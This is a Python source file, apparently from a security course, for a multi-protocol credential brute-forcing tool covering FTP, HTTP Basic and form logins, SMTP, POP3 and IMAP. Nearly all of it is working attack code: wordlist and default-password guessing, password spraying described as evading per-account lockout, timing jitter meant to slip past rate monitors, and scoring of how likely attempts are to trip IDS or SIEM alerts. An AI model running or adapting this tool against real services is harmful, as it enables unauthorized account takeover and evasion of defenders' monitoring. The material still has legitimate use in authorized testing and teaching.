#!/usr/bin/env python3
"""
Project 06 — Network Service Credential Auditor
Applied AI Security Projects · Module 01 · Week 01

Multi-protocol credential auditing framework built entirely on the Python
standard library.  Tests FTP · HTTP Basic · HTTP Form · SMTP · POP3 · IMAP
services against user-supplied wordlists with adaptive rate-limiting, per-service
lockout detection, OPSEC analysis, and MITRE ATT&CK–tagged JSON reporting.

What makes this different
─────────────────────────
Naive approach  : for loop over a wordlist, print "success" or "failed", no awareness
                  of lockout windows, no structured output, single-protocol.
This tool       : typed protocol plugin architecture, per-service lockout state machine,
                  adaptive jitter-based rate limiting, multi-target concurrency,
                  OPSEC risk scoring, and a structured JSON report that feeds downstream
                  tooling (combine with Project 03 banner-grabber output for full recon→
                  exploit chain).

Supported protocols (stdlib only — zero pip installs)
  • FTP        — ftplib.FTP / FTP_TLS
  • HTTP Basic — urllib.request with HTTPBasicAuthHandler
  • HTTP Form  — urllib.request POST with session-cookie tracking
  • SMTP AUTH  — smtplib.SMTP / SMTP_SSL (LOGIN, PLAIN, CRAM-MD5)
  • POP3       — poplib.POP3 / POP3_SSL
  • IMAP       — imaplib.IMAP4 / IMAP4_SSL

Author : Applied AI Security Projects
Lab    : macOS M4 host + VMware Fusion (192.168.100.0/24)
MITRE  : T1110   – Brute Force
         T1110.001 – Password Guessing
         T1110.003 – Password Spraying
         T1078   – Valid Accounts
"""

from __future__ import annotations

import argparse
import ftplib
import imaplib
import json
import os
import poplib
import queue
import random
import re
import smtplib
import socket
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from abc import ABC, abstractmethod
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from enum import Enum, auto
from typing import Iterator, Optional
from http.cookiejar import CookieJar


# ──────────────────────────────────────────────────────────────────────────────
# Terminal colours (fall back gracefully when stdout is not a TTY)
# ──────────────────────────────────────────────────────────────────────────────

_USE_COLOR = sys.stdout.isatty()

def _c(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _USE_COLOR else text

def green(t: str) -> str:   return _c("92", t)
def red(t: str) -> str:     return _c("91", t)
def yellow(t: str) -> str:  return _c("93", t)
def cyan(t: str) -> str:    return _c("96", t)
def bold(t: str) -> str:    return _c("1",  t)
def dim(t: str) -> str:     return _c("2",  t)
def magenta(t: str) -> str: return _c("95", t)


# ──────────────────────────────────────────────────────────────────────────────
# Enumerations
# ──────────────────────────────────────────────────────────────────────────────

class Protocol(str, Enum):
    FTP        = "ftp"
    HTTP_BASIC = "http-basic"
    HTTP_FORM  = "http-form"
    SMTP       = "smtp"
    POP3       = "pop3"
    IMAP       = "imap"


class AttemptStatus(str, Enum):
    SUCCESS    = "success"
    FAILURE    = "failure"
    LOCKOUT    = "lockout"
    ERROR      = "error"
    SKIPPED    = "skipped"


class LockoutState(Enum):
    CLEAN      = auto()   # no lockout signal detected
    WARNING    = auto()   # failure rate spike — slow down
    LOCKED     = auto()   # service stopped responding / explicit 429/423


# ──────────────────────────────────────────────────────────────────────────────
# Dataclasses
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class Credential:
    username: str
    password: str

    def __str__(self) -> str:
        return f"{self.username}:{self.password}"


@dataclass
class TargetService:
    host: str
    port: int
    protocol: Protocol
    tls: bool = False
    # HTTP-Form extras
    login_url: str = ""
    username_field: str = "username"
    password_field: str = "password"
    success_pattern: str = ""   # regex matched against response body
    failure_pattern: str = ""   # regex matched against response body
    # SMTP extra
    smtp_domain: str = "localhost"

    def label(self) -> str:
        scheme = self.protocol.value + ("s" if self.tls else "")
        return f"{scheme}://{self.host}:{self.port}"


@dataclass
class AttemptResult:
    credential: Credential
    status: AttemptStatus
    latency_ms: float
    detail: str = ""

    def to_dict(self) -> dict:
        return {
            "username": self.credential.username,
            "password": self.credential.password,
            "status": self.status.value,
            "latency_ms": round(self.latency_ms, 2),
            "detail": self.detail,
        }


@dataclass
class ServiceAuditResult:
    target: TargetService
    attempts: list[AttemptResult] = field(default_factory=list)
    found_credentials: list[Credential] = field(default_factory=list)
    lockout_events: int = 0
    start_time: str = ""
    end_time: str = ""
    opsec_risk: str = "LOW"

    def success_count(self) -> int:
        return sum(1 for a in self.attempts if a.status == AttemptStatus.SUCCESS)

    def failure_count(self) -> int:
        return sum(1 for a in self.attempts if a.status == AttemptStatus.FAILURE)

    def error_count(self) -> int:
        return sum(1 for a in self.attempts if a.status == AttemptStatus.ERROR)

    def to_dict(self) -> dict:
        return {
            "target": {
                "host": self.target.host,
                "port": self.target.port,
                "protocol": self.target.protocol.value,
                "tls": self.target.tls,
                "label": self.target.label(),
            },
            "summary": {
                "total_attempts": len(self.attempts),
                "successes": self.success_count(),
                "failures": self.failure_count(),
                "errors": self.error_count(),
                "lockout_events": self.lockout_events,
                "opsec_risk": self.opsec_risk,
            },
            "found_credentials": [str(c) for c in self.found_credentials],
            "attempts": [a.to_dict() for a in self.attempts],
            "start_time": self.start_time,
            "end_time": self.end_time,
        }


@dataclass
class AuditReport:
    scan_id: str
    started_at: str
    finished_at: str
    mitre: list[dict] = field(default_factory=list)
    service_results: list[ServiceAuditResult] = field(default_factory=list)

    def total_found(self) -> int:
        return sum(len(r.found_credentials) for r in self.service_results)

    def to_dict(self) -> dict:
        return {
            "scan_id": self.scan_id,
            "started_at": self.started_at,
            "finished_at": self.finished_at,
            "mitre_attack": self.mitre,
            "total_credentials_found": self.total_found(),
            "services": [r.to_dict() for r in self.service_results],
        }


# ──────────────────────────────────────────────────────────────────────────────
# Lockout detector — per-service sliding-window failure tracking
# ──────────────────────────────────────────────────────────────────────────────

class LockoutDetector:
    """
    Tracks consecutive failures and wall-clock failure rate to detect lockout.

    Design: uses two signals —
      1. Consecutive failures > threshold  →  WARNING (slow down)
      2. Avg latency drops sharply (< 50 ms) after many failures →  LOCKED
         (service is blocking immediately, not actually checking credentials)
    """

    def __init__(
        self,
        consec_threshold: int = 5,
        window_seconds: float = 30.0,
        window_max_failures: int = 10,
    ) -> None:
        self._consec: int = 0
        self._threshold = consec_threshold
        self._timestamps: list[float] = []
        self._window = window_seconds
        self._window_max = window_max_failures
        self._state = LockoutState.CLEAN
        self._lock = threading.Lock()

    def record(self, status: AttemptStatus, latency_ms: float) -> LockoutState:
        with self._lock:
            now = time.monotonic()
            # Prune old timestamps outside the window
            self._timestamps = [t for t in self._timestamps if now - t < self._window]

            if status == AttemptStatus.SUCCESS:
                self._consec = 0
                self._state = LockoutState.CLEAN
                return self._state

            if status == AttemptStatus.FAILURE:
                self._consec += 1
                self._timestamps.append(now)
            elif status in (AttemptStatus.LOCKOUT, AttemptStatus.ERROR):
                self._consec += 1
                self._timestamps.append(now)
                # Immediate-block heuristic: suspiciously fast failure
                if latency_ms < 50 and self._consec >= 3:
                    self._state = LockoutState.LOCKED
                    return self._state

            if self._consec >= self._threshold:
                self._state = LockoutState.WARNING
            if len(self._timestamps) >= self._window_max:
                self._state = LockoutState.LOCKED

            return self._state

    @property
    def state(self) -> LockoutState:
        with self._lock:
            return self._state

    def reset(self) -> None:
        with self._lock:
            self._consec = 0
            self._timestamps.clear()
            self._state = LockoutState.CLEAN


# ──────────────────────────────────────────────────────────────────────────────
# Rate limiter — configurable delay with Gaussian jitter
# ──────────────────────────────────────────────────────────────────────────────

class RateLimiter:
    """
    Enforces per-attempt delay with optional Gaussian jitter to mimic human
    typing cadence and reduce detection by threshold-based rate monitors.

    Adaptive backoff: backs off exponentially when lockout WARNING is raised,
    resets to base delay on success.
    """

    def __init__(self, base_delay: float = 0.5, jitter: float = 0.2) -> None:
        self._base = base_delay
        self._jitter = jitter
        self._current = base_delay

    def wait(self) -> None:
        noise = random.gauss(0, self._jitter)
        sleep_for = max(0.0, self._current + noise)
        time.sleep(sleep_for)

    def backoff(self) -> None:
        """Double delay on lockout warning (up to 30 s)."""
        self._current = min(self._current * 2.0, 30.0)

    def reset(self) -> None:
        self._current = self._base


# ──────────────────────────────────────────────────────────────────────────────
# Abstract protocol auditor base
# ──────────────────────────────────────────────────────────────────────────────

class ProtocolAuditor(ABC):
    """
    Base class for all protocol-specific auditors.  Each subclass implements
    `try_credential()` which returns an AttemptResult.

    Thread safety: instances are created once per target, then called from
    multiple worker threads.  Each `try_credential()` call must open its own
    connection — do NOT share connection state between calls.
    """

    def __init__(self, target: TargetService, timeout: float = 8.0) -> None:
        self.target = target
        self.timeout = timeout

    @abstractmethod
    def try_credential(self, cred: Credential) -> AttemptResult:
        ...

    @staticmethod
    def _timed_call(fn, *args, **kwargs) -> tuple[object, float]:
        """Execute fn(*args, **kwargs), return (result, elapsed_ms)."""
        t0 = time.monotonic()
        result = fn(*args, **kwargs)
        return result, (time.monotonic() - t0) * 1000


# ──────────────────────────────────────────────────────────────────────────────
# FTP auditor
# ──────────────────────────────────────────────────────────────────────────────

class FTPAuditor(ProtocolAuditor):
    """
    Uses ftplib.FTP (or FTP_TLS for implicit TLS on port 990).
    Detects 530 "Login incorrect" vs 230 "Login successful" response codes.
    Also catches 421 "Too many connections" as a lockout signal.
    """

    def try_credential(self, cred: Credential) -> AttemptResult:
        t0 = time.monotonic()
        try:
            if self.target.tls:
                ftp = ftplib.FTP_TLS(timeout=self.timeout)
            else:
                ftp = ftplib.FTP(timeout=self.timeout)

            ftp.connect(self.target.host, self.target.port)
            ftp.login(cred.username, cred.password)
            ftp.quit()
            latency = (time.monotonic() - t0) * 1000
            return AttemptResult(cred, AttemptStatus.SUCCESS, latency, "Login accepted")

        except ftplib.error_perm as exc:
            latency = (time.monotonic() - t0) * 1000
            msg = str(exc)
            if "421" in msg or "too many" in msg.lower():
                return AttemptResult(cred, AttemptStatus.LOCKOUT, latency, msg[:120])
            return AttemptResult(cred, AttemptStatus.FAILURE, latency, msg[:120])

        except (socket.timeout, OSError, ftplib.Error) as exc:
            latency = (time.monotonic() - t0) * 1000
            return AttemptResult(cred, AttemptStatus.ERROR, latency, str(exc)[:120])


# ──────────────────────────────────────────────────────────────────────────────
# HTTP Basic Auth auditor
# ──────────────────────────────────────────────────────────────────────────────

class HTTPBasicAuditor(ProtocolAuditor):
    """
    Sends a single GET request with an Authorization: Basic header and checks
    the HTTP status code.
    200 / 302 → SUCCESS
    401 / 403 → FAILURE
    429 / 423 → LOCKOUT (rate-limit / locked-out header)
    """

    def try_credential(self, cred: Credential) -> AttemptResult:
        t0 = time.monotonic()
        scheme = "https" if self.target.tls else "http"
        path = self.target.login_url or "/"
        url = f"{scheme}://{self.target.host}:{self.target.port}{path}"

        password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
        password_mgr.add_password(None, url, cred.username, cred.password)
        handler = urllib.request.HTTPBasicAuthHandler(password_mgr)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        https_handler = urllib.request.HTTPSHandler(context=ctx)
        opener = urllib.request.build_opener(handler, https_handler)

        try:
            resp = opener.open(url, timeout=self.timeout)
            latency = (time.monotonic() - t0) * 1000
            return AttemptResult(cred, AttemptStatus.SUCCESS, latency,
                                 f"HTTP {resp.status}")

        except urllib.error.HTTPError as exc:
            latency = (time.monotonic() - t0) * 1000
            if exc.code in (429, 423):
                return AttemptResult(cred, AttemptStatus.LOCKOUT, latency,
                                     f"HTTP {exc.code}")
            if exc.code in (401, 403):
                return AttemptResult(cred, AttemptStatus.FAILURE, latency,
                                     f"HTTP {exc.code}")
            # 200/302 after redirect from auth handler counts as success
            if exc.code in (200, 302, 301):
                return AttemptResult(cred, AttemptStatus.SUCCESS, latency,
                                     f"HTTP {exc.code}")
            return AttemptResult(cred, AttemptStatus.FAILURE, latency,
                                 f"HTTP {exc.code}")

        except (urllib.error.URLError, OSError) as exc:
            latency = (time.monotonic() - t0) * 1000
            return AttemptResult(cred, AttemptStatus.ERROR, latency, str(exc)[:120])


# ──────────────────────────────────────────────────────────────────────────────
# HTTP Form Auth auditor
# ──────────────────────────────────────────────────────────────────────────────

class HTTPFormAuditor(ProtocolAuditor):
    """
    POSTs credentials to a login form URL and checks the response body
    against user-supplied success/failure regex patterns.

    Maintains a per-connection CookieJar so session tokens are preserved
    across the redirect chain that most login forms issue after POST.

    Fallback when no pattern is given: treat a 302 redirect to a non-login
    URL as success (the most common web-app login behaviour).
    """

    def try_credential(self, cred: Credential) -> AttemptResult:
        t0 = time.monotonic()
        scheme = "https" if self.target.tls else "http"
        url = f"{scheme}://{self.target.host}:{self.target.port}{self.target.login_url}"

        data = urllib.parse.urlencode({
            self.target.username_field: cred.username,
            self.target.password_field: cred.password,
        }).encode()

        jar = CookieJar()
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(jar),
            urllib.request.HTTPSHandler(context=ctx),
        )

        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("User-Agent",
                       "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0")

        try:
            resp = opener.open(req, timeout=self.timeout)
            latency = (time.monotonic() - t0) * 1000
            body = resp.read(4096).decode("utf-8", errors="ignore")
            final_url = resp.geturl()

            if self.target.success_pattern:
                if re.search(self.target.success_pattern, body, re.IGNORECASE):
                    return AttemptResult(cred, AttemptStatus.SUCCESS, latency,
                                         f"success pattern matched | url={final_url}")
            if self.target.failure_pattern:
                if re.search(self.target.failure_pattern, body, re.IGNORECASE):
                    return AttemptResult(cred, AttemptStatus.FAILURE, latency,
                                         "failure pattern matched")

            # Heuristic: redirected away from the login page → likely success
            login_path = self.target.login_url.rstrip("/")
            if login_path and login_path not in final_url:
                return AttemptResult(cred, AttemptStatus.SUCCESS, latency,
                                     f"redirected to {final_url}")

            return AttemptResult(cred, AttemptStatus.FAILURE, latency,
                                 f"no success signal | url={final_url}")

        except urllib.error.HTTPError as exc:
            latency = (time.monotonic() - t0) * 1000
            if exc.code in (429, 423):
                return AttemptResult(cred, AttemptStatus.LOCKOUT, latency,
                                     f"HTTP {exc.code}")
            return AttemptResult(cred, AttemptStatus.FAILURE, latency,
                                 f"HTTP {exc.code}")

        except (urllib.error.URLError, OSError) as exc:
            latency = (time.monotonic() - t0) * 1000
            return AttemptResult(cred, AttemptStatus.ERROR, latency, str(exc)[:120])


# ──────────────────────────────────────────────────────────────────────────────
# SMTP AUTH auditor
# ──────────────────────────────────────────────────────────────────────────────

class SMTPAuditor(ProtocolAuditor):
    """
    Attempts SMTP AUTH LOGIN, AUTH PLAIN, and AUTH CRAM-MD5 (in that order,
    based on what the server advertises in its EHLO response).

    Uses smtplib.SMTP_SSL for port 465 (implicit TLS) and STARTTLS upgrade
    for port 587 or 25 (opportunistic TLS).
    """

    def try_credential(self, cred: Credential) -> AttemptResult:
        t0 = time.monotonic()
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        try:
            if self.target.tls or self.target.port == 465:
                server = smtplib.SMTP_SSL(
                    self.target.host, self.target.port,
                    timeout=self.timeout, context=ctx)
            else:
                server = smtplib.SMTP(
                    self.target.host, self.target.port,
                    timeout=self.timeout)
                server.ehlo(self.target.smtp_domain)
                if server.has_extn("STARTTLS"):
                    server.starttls(context=ctx)
                    server.ehlo(self.target.smtp_domain)

            server.login(cred.username, cred.password)
            server.quit()
            latency = (time.monotonic() - t0) * 1000
            return AttemptResult(cred, AttemptStatus.SUCCESS, latency,
                                 "AUTH accepted")

        except smtplib.SMTPAuthenticationError as exc:
            latency = (time.monotonic() - t0) * 1000
            msg = str(exc)
            if "535" in msg or "534" in msg:
                return AttemptResult(cred, AttemptStatus.FAILURE, latency, msg[:120])
            if "454" in msg or "421" in msg:
                return AttemptResult(cred, AttemptStatus.LOCKOUT, latency, msg[:120])
            return AttemptResult(cred, AttemptStatus.FAILURE, latency, msg[:120])

        except (smtplib.SMTPException, socket.timeout, OSError) as exc:
            latency = (time.monotonic() - t0) * 1000
            return AttemptResult(cred, AttemptStatus.ERROR, latency, str(exc)[:120])


# ──────────────────────────────────────────────────────────────────────────────
# POP3 auditor
# ──────────────────────────────────────────────────────────────────────────────

class POP3Auditor(ProtocolAuditor):
    """
    poplib.POP3 / POP3_SSL.  RFC 1939 §7: +OK or -ERR on each command.
    poplib raises poplib.error_proto for -ERR responses.
    """

    def try_credential(self, cred: Credential) -> AttemptResult:
        t0 = time.monotonic()
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        try:
            if self.target.tls or self.target.port == 995:
                conn = poplib.POP3_SSL(
                    self.target.host, self.target.port,
                    timeout=self.timeout, context=ctx)
            else:
                conn = poplib.POP3(
                    self.target.host, self.target.port,
                    timeout=self.timeout)

            conn.user(cred.username)
            conn.pass_(cred.password)
            conn.quit()
            latency = (time.monotonic() - t0) * 1000
            return AttemptResult(cred, AttemptStatus.SUCCESS, latency,
                                 "+OK authenticated")

        except poplib.error_proto as exc:
            latency = (time.monotonic() - t0) * 1000
            msg = exc.args[0].decode("utf-8", errors="replace") if exc.args else ""
            if "lock" in msg.lower() or "try again" in msg.lower():
                return AttemptResult(cred, AttemptStatus.LOCKOUT, latency, msg[:120])
            return AttemptResult(cred, AttemptStatus.FAILURE, latency, msg[:120])

        except (socket.timeout, OSError) as exc:
            latency = (time.monotonic() - t0) * 1000
            return AttemptResult(cred, AttemptStatus.ERROR, latency, str(exc)[:120])


# ──────────────────────────────────────────────────────────────────────────────
# IMAP auditor
# ──────────────────────────────────────────────────────────────────────────────

class IMAPAuditor(ProtocolAuditor):
    """
    imaplib.IMAP4 / IMAP4_SSL.  RFC 3501 LOGIN command.
    imaplib raises imaplib.error on NO/BAD tagged responses.

    Note: IMAP servers commonly issue a BYE after N failed logins (typically 3–5).
    The LockoutDetector will catch the resulting socket errors and flag them.
    """

    def try_credential(self, cred: Credential) -> AttemptResult:
        t0 = time.monotonic()
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        try:
            if self.target.tls or self.target.port == 993:
                conn = imaplib.IMAP4_SSL(
                    self.target.host, self.target.port, ssl_context=ctx)
            else:
                conn = imaplib.IMAP4(self.target.host, self.target.port)

            conn.socket().settimeout(self.timeout)
            typ, data = conn.login(cred.username, cred.password)
            conn.logout()
            latency = (time.monotonic() - t0) * 1000

            if typ == "OK":
                return AttemptResult(cred, AttemptStatus.SUCCESS, latency,
                                     f"LOGIN OK: {data[0][:80] if data else ''}")
            return AttemptResult(cred, AttemptStatus.FAILURE, latency,
                                 str(data)[:120])

        except imaplib.IMAP4.error as exc:
            latency = (time.monotonic() - t0) * 1000
            msg = str(exc)
            if "too many" in msg.lower() or "bye" in msg.lower():
                return AttemptResult(cred, AttemptStatus.LOCKOUT, latency, msg[:120])
            return AttemptResult(cred, AttemptStatus.FAILURE, latency, msg[:120])

        except (socket.timeout, OSError) as exc:
            latency = (time.monotonic() - t0) * 1000
            return AttemptResult(cred, AttemptStatus.ERROR, latency, str(exc)[:120])


# ──────────────────────────────────────────────────────────────────────────────
# Protocol auditor factory
# ──────────────────────────────────────────────────────────────────────────────

_AUDITOR_MAP: dict[Protocol, type[ProtocolAuditor]] = {
    Protocol.FTP:        FTPAuditor,
    Protocol.HTTP_BASIC: HTTPBasicAuditor,
    Protocol.HTTP_FORM:  HTTPFormAuditor,
    Protocol.SMTP:       SMTPAuditor,
    Protocol.POP3:       POP3Auditor,
    Protocol.IMAP:       IMAPAuditor,
}

def make_auditor(target: TargetService, timeout: float) -> ProtocolAuditor:
    cls = _AUDITOR_MAP.get(target.protocol)
    if cls is None:
        raise ValueError(f"Unsupported protocol: {target.protocol}")
    return cls(target, timeout)


# ──────────────────────────────────────────────────────────────────────────────
# Wordlist loader — supports inline combos, colon-separated files, user:pass files
# ──────────────────────────────────────────────────────────────────────────────

class WordlistLoader:
    """
    Loads credentials from multiple sources:
      --usernames u1,u2,u3  + --passwords p1,p2,p3  →  cartesian product
      --combo-file path      →  user:pass per line
      --cred                 →  single user:pass on CLI

    Smart ordering: shorter, common passwords bubble to the front via a
    simple heuristic weight (length + digit ratio), so `admin:admin` is
    tried before `admin:Tr0ub4dor&3`.
    """

    # Common credential pairs tried first regardless of wordlist order
    PRIORITY_CREDS = [
        ("admin",  "admin"),
        ("admin",  "password"),
        ("admin",  "123456"),
        ("admin",  ""),
        ("root",   "root"),
        ("root",   "toor"),
        ("root",   ""),
        ("user",   "user"),
        ("guest",  "guest"),
        ("test",   "test"),
        ("admin",  "admin123"),
        ("pi",     "raspberry"),
        ("ubuntu", "ubuntu"),
        ("ftp",    "ftp"),
        ("anonymous", ""),
        ("anonymous", "anonymous@"),
    ]

    @staticmethod
    def _weight(password: str) -> float:
        """Lower weight = try sooner. Penalise long passwords."""
        if not password:
            return 0.0
        return float(len(password)) + (1.0 - sum(c.isdigit() for c in password) / len(password))

    @classmethod
    def load(
        cls,
        usernames: list[str],
        passwords: list[str],
        combo_file: Optional[str],
        single_cred: Optional[str],
        spray_mode: bool,
    ) -> list[Credential]:
        seen: set[tuple[str, str]] = set()
        creds: list[Credential] = []

        def add(u: str, p: str) -> None:
            key = (u.strip(), p.strip())
            if key not in seen:
                seen.add(key)
                creds.append(Credential(*key))

        # Priority credentials always go first
        for u, p in cls.PRIORITY_CREDS:
            add(u, p)

        if single_cred:
            parts = single_cred.split(":", 1)
            add(parts[0], parts[1] if len(parts) > 1 else "")

        if combo_file:
            try:
                with open(combo_file, encoding="utf-8", errors="ignore") as fh:
                    for line in fh:
                        line = line.rstrip("\n")
                        if ":" in line:
                            u, p = line.split(":", 1)
                            add(u, p)
            except OSError as exc:
                print(red(f"[!] Cannot read combo file: {exc}"))

        if usernames and passwords:
            if spray_mode:
                # Password spraying: for each password try ALL users
                # (reduces per-user failure count, evades per-account lockout)
                sorted_pw = sorted(passwords, key=cls._weight)
                for pw in sorted_pw:
                    for un in usernames:
                        add(un, pw)
            else:
                # Standard mode: for each user try all passwords
                sorted_pw = sorted(passwords, key=cls._weight)
                for un in usernames:
                    for pw in sorted_pw:
                        add(un, pw)

        # Filter out priority creds that aren't in the supplied username list
        # (keep them only if no explicit username list was given)
        if usernames:
            u_set = set(usernames)
            return [c for c in creds if c.username in u_set]

        return creds


# ──────────────────────────────────────────────────────────────────────────────
# OPSEC risk calculator
# ──────────────────────────────────────────────────────────────────────────────

def calculate_opsec_risk(
    attempts: int,
    lockout_events: int,
    elapsed_seconds: float,
    delay: float,
) -> tuple[str, list[str]]:
    """
    Returns (risk_label, [notes]).
    CRITICAL → HIGH → MEDIUM → LOW

    Factors:
      - Attempts per second (>1/s is CRITICAL, 0.5–1/s is HIGH)
      - Lockout events detected
      - No delay configured
    """
    notes: list[str] = []
    risk = "LOW"

    rate = attempts / max(elapsed_seconds, 1)
    if rate > 1.0:
        risk = "CRITICAL"
        notes.append(f"Rate {rate:.2f} req/s — almost certainly triggers IDS/SIEM alerts")
    elif rate > 0.5:
        risk = "HIGH"
        notes.append(f"Rate {rate:.2f} req/s — may trip threshold-based detections")
    elif rate > 0.1:
        risk = "MEDIUM"
        notes.append(f"Rate {rate:.2f} req/s — slow enough to evade simple rate monitors")
    else:
        notes.append(f"Rate {rate:.2f} req/s — within realistic human login cadence")

    if lockout_events > 0:
        risk = "CRITICAL"
        notes.append(f"{lockout_events} lockout events detected — account(s) likely locked")

    if delay == 0:
        if risk == "LOW":
            risk = "MEDIUM"
        notes.append("No delay configured — all attempts fired back-to-back")

    notes.append(f"MITRE T1110.001 (Password Guessing) — log source: auth logs, failed login events")
    return risk, notes


# ──────────────────────────────────────────────────────────────────────────────
# Audit engine — orchestrates workers, lockout detector, rate limiter
# ──────────────────────────────────────────────────────────────────────────────

class AuditEngine:
    """
    Runs credential attempts against a single TargetService using a thread pool.

    Threading model:
      - A queue is loaded with all Credential objects
      - `workers` threads pull from the queue and call auditor.try_credential()
      - A shared LockoutDetector and RateLimiter are consulted before each attempt
      - Results are appended to a thread-safe list via a lock
      - When LOCKED state is reached the engine drains the queue and stops
    """

    def __init__(
        self,
        target: TargetService,
        credentials: list[Credential],
        timeout: float = 8.0,
        workers: int = 4,
        delay: float = 0.5,
        jitter: float = 0.2,
        stop_on_success: bool = False,
        verbose: bool = False,
    ) -> None:
        self.target = target
        self.credentials = credentials
        self.timeout = timeout
        self.workers = workers
        self.delay = delay
        self.jitter = jitter
        self.stop_on_success = stop_on_success
        self.verbose = verbose

        self._q: queue.Queue[Credential] = queue.Queue()
        self._results: list[AttemptResult] = []
        self._found: list[Credential] = []
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self._lockout_detector = LockoutDetector()
        self._rate_limiter = RateLimiter(base_delay=delay, jitter=jitter)
        self._auditor = make_auditor(target, timeout)

    def _worker(self) -> None:
        while not self._stop_event.is_set():
            try:
                cred = self._q.get(timeout=0.2)
            except queue.Empty:
                break

            # Honour lockout state before firing
            if self._lockout_detector.state == LockoutState.LOCKED:
                result = AttemptResult(cred, AttemptStatus.SKIPPED, 0.0,
                                       "skipped — lockout detected")
                with self._lock:
                    self._results.append(result)
                self._q.task_done()
                continue

            if self._lockout_detector.state == LockoutState.WARNING:
                self._rate_limiter.backoff()

            self._rate_limiter.wait()

            result = self._auditor.try_credential(cred)

            # Update lockout state
            ls = self._lockout_detector.record(result.status, result.latency_ms)
            if ls == LockoutState.LOCKED:
                self._stop_event.set()

            with self._lock:
                self._results.append(result)
                if result.status == AttemptStatus.SUCCESS:
                    self._found.append(cred)
                    if self.stop_on_success:
                        self._stop_event.set()

            # Live output
            self._print_result(result)
            self._q.task_done()

    def _print_result(self, r: AttemptResult) -> None:
        label = self.target.label()
        ts = datetime.now().strftime("%H:%M:%S")
        cred_str = str(r.credential)
        lat = f"{r.latency_ms:6.0f}ms"

        if r.status == AttemptStatus.SUCCESS:
            print(f"  {green('✓')} [{ts}] {bold(green(cred_str))}  {dim(lat)}  {green(r.detail)}")
        elif r.status == AttemptStatus.LOCKOUT:
            print(f"  {red('⚠')} [{ts}] LOCKOUT  {dim(lat)}  {yellow(r.detail[:80])}")
        elif r.status == AttemptStatus.ERROR:
            if self.verbose:
                print(f"  {yellow('!')} [{ts}] {dim(cred_str)}  {dim(lat)}  {dim(r.detail[:80])}")
        elif r.status == AttemptStatus.SKIPPED:
            pass  # Silent
        else:
            if self.verbose:
                print(f"  {dim('✗')} [{ts}] {dim(cred_str)}  {dim(lat)}")

    def run(self) -> ServiceAuditResult:
        for cred in self.credentials:
            self._q.put(cred)

        started = datetime.now(timezone.utc).isoformat()
        t0 = time.monotonic()

        label = self.target.label()
        total = len(self.credentials)
        print(f"\n{bold(cyan('▶'))} {bold(label)}  "
              f"{dim(f'{total} credentials · {self.workers} workers · delay={self.delay}s')}")

        threads = [threading.Thread(target=self._worker, daemon=True)
                   for _ in range(self.workers)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        elapsed = time.monotonic() - t0
        finished = datetime.now(timezone.utc).isoformat()

        risk, opsec_notes = calculate_opsec_risk(
            len(self._results),
            self._lockout_detector.state == LockoutState.LOCKED and 1 or 0,
            elapsed,
            self.delay,
        )

        result = ServiceAuditResult(
            target=self.target,
            attempts=self._results,
            found_credentials=self._found,
            lockout_events=sum(
                1 for r in self._results if r.status == AttemptStatus.LOCKOUT
            ),
            start_time=started,
            end_time=finished,
            opsec_risk=risk,
        )

        self._print_summary(result, elapsed, opsec_notes)
        return result

    def _print_summary(
        self,
        r: ServiceAuditResult,
        elapsed: float,
        opsec_notes: list[str],
    ) -> None:
        print()
        print(f"  {bold('Summary')}  {r.target.label()}")
        print(f"  {'Attempts:':<18} {r.success_count() + r.failure_count() + r.error_count()}")
        print(f"  {'Successes:':<18} {green(str(r.success_count()))}")
        print(f"  {'Failures:':<18} {r.failure_count()}")
        print(f"  {'Errors:':<18} {r.error_count()}")
        print(f"  {'Lockout events:':<18} {red(str(r.lockout_events)) if r.lockout_events else '0'}")
        print(f"  {'Elapsed:':<18} {elapsed:.1f}s")
        print(f"  {'OPSEC risk:':<18} {_risk_color(r.opsec_risk)}")

        if r.found_credentials:
            print()
            print(f"  {bold(green('Found credentials:'))}")
            for c in r.found_credentials:
                print(f"    {green('✓')} {bold(str(c))}")

        print()
        print(f"  {bold('OPSEC notes:')}")
        for note in opsec_notes:
            print(f"    {dim('·')} {note}")


def _risk_color(risk: str) -> str:
    return {"CRITICAL": red(bold("CRITICAL")),
            "HIGH":     red("HIGH"),
            "MEDIUM":   yellow("MEDIUM"),
            "LOW":      green("LOW")}.get(risk, risk)


# ──────────────────────────────────────────────────────────────────────────────
# Report printer
# ──────────────────────────────────────────────────────────────────────────────

def print_final_report(report: AuditReport) -> None:
    print()
    print("─" * 72)
    print(bold(cyan("  AUDIT REPORT")))
    print("─" * 72)
    print(f"  Scan ID   : {dim(report.scan_id)}")
    print(f"  Started   : {report.started_at}")
    print(f"  Finished  : {report.finished_at}")
    print(f"  Services  : {len(report.service_results)}")
    print(f"  Creds found: {bold(green(str(report.total_found())))}")
    print()

    for svc in report.service_results:
        status = (green("COMPROMISED") if svc.found_credentials
                  else red("NO ACCESS") if svc.lockout_events
                  else dim("HARDENED"))
        print(f"  {bold(svc.target.label())}  →  {status}")
        for c in svc.found_credentials:
            print(f"      {green('✓')} {bold(str(c))}")

    print()
    print(bold("  MITRE ATT&CK"))
    for entry in report.mitre:
        print(f"    {cyan(entry['id'])}  {entry['name']}")
        print(f"    {dim(entry['url'])}")
    print("─" * 72)


